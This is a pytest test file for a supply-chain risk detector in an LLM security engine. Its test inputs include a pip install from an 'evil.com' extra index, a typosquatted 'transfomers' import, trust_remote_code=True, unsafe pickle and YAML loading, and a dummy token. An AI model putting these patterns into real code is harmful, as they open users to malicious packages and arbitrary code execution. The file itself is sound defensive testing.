"""Tests for the SupplyChainPlugin (LLM03)."""
import pytest
from apps.security_engine.plugins.supply_chain import (
    SupplyChainPlugin,
    _calculate_risk_score,
    _classify_supply_chain_type,
    _classify_threat_level,
    _generate_remediation,
)
from apps.security_engine.results import DetectionDetail
from apps.security_engine.exceptions import InvalidTargetError


class TestSupplyChainPlugin:
    @pytest.fixture
    def plugin(self):
        return SupplyChainPlugin()

    def test_metadata(self, plugin):
        meta = plugin.metadata
        assert meta.module_type == 'supply_chain'
        assert meta.name == 'Supply Chain Detector'
        assert meta.version == '1.0.0'

    def test_validate_target(self, plugin):
        assert plugin.validate_target('some code') is True
        assert plugin.validate_target('') is False
        assert plugin.validate_target(123) is False

    def test_clean_text(self, plugin):
        result = plugin.scan('print("hello world")')
        assert result.risk_score == 0
        assert result.findings[0].finding_type == 'clean'

    def test_trust_remote_code(self, plugin):
        result = plugin.scan('model = AutoModel.from_pretrained("model", trust_remote_code=True)')
        assert result.risk_score > 60
        assert result.summary['has_risk'] is True

    def test_unsafe_pickle(self, plugin):
        result = plugin.scan('data = pickle.load(open("model.pkl", "rb"))')
        assert result.risk_score > 50
        assert result.summary['has_risk'] is True

    def test_pip_external_index(self, plugin):
        result = plugin.scan('pip install --extra-index-url https://evil.com/packages mypkg')
        assert result.risk_score > 40
        assert result.summary['has_risk'] is True

    def test_typosquat_transformers(self, plugin):
        result = plugin.scan('import transfomers')
        assert result.risk_score > 50
        assert result.summary['has_risk'] is True

    def test_unversioned_model(self, plugin):
        result = plugin.scan('model = AutoModel.from_pretrained("facebook/opt-125m")')
        assert result.risk_score > 20
        assert result.summary['has_risk'] is True

    def test_unsafe_yaml(self, plugin):
        result = plugin.scan('yaml.load(data, Loader=yaml.UnsafeLoader)')
        assert result.risk_score > 50
        assert result.summary['has_risk'] is True

    def test_exposed_aws_key_in_dep(self, plugin):
        result = plugin.scan('os.environ["HUGGINGFACE_TOKEN"] = "hf_AAAAAAAAAAAAAAAAAAAAAAAAAAAA"')
        assert result.status == 'completed'

    def test_requirements_unpinned(self, plugin):
        result = plugin.scan('''
transformers>=4.30.0
torch>=2.0.0
requests
''', config={'categories': ['vulnerable_deps']})
        assert result.status == 'completed'

    def test_multiple_risks(self, plugin):
        result = plugin.scan(
            'AutoModel.from_pretrained("model", trust_remote_code=True)\n'
            'pickle.load(open("model.pkl", "rb"))\n'
            'import transfomers\n'
        )
        assert result.risk_score > 70
        assert result.summary['has_risk'] is True
        assert len(result.summary['detection_breakdown']) > 0

    def test_empty_target(self, plugin):
        with pytest.raises(InvalidTargetError):
            plugin.scan('')


class TestHelperFunctions:
    def test_risk_score_empty(self):
        assert _calculate_risk_score([]) == 0.0

    def test_classify_empty(self):
        assert _classify_supply_chain_type([]) == 'none'

    def test_classify_execution_risk(self):
        detections = [DetectionDetail(type='unsafe_execution_unsafe_yaml', description='test', confidence=0.80)]
        assert _classify_supply_chain_type(detections) == 'code_execution_risk'

    def test_threat_level(self):
        assert _classify_threat_level(85) == 'critical'
        assert _classify_threat_level(50) == 'medium'

    def test_remediation_exists(self):
        for stype in ['code_execution_risk', 'dependency_confusion',
                       'insecure_model_loading', 'none']:
            assert len(_generate_remediation(stype, [])) > 0
